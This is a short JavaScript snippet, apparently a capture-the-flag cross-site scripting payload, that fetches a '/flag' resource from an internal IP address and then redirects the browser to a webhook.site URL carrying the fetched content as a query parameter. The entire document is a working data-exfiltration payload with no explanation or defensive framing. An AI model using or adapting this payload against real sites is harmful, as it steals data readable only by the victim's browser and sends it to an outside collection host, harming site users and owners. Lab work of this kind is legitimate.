fetch('http://165.232.190.5:1900/flag')
  .then(response => response.text())
  .then(contents => {
    flagContent = contents;
    console.log('Content successfully fetched!');
    const webhookUrl = "https://webhook.site/10742b6c-2f72-4215-a644-6c7c11cfd1dd/?flag="+flagContent;
    window.location.href = webhookUrl;
  })
  .catch(error => {
    console.error('Error:', error);
 });
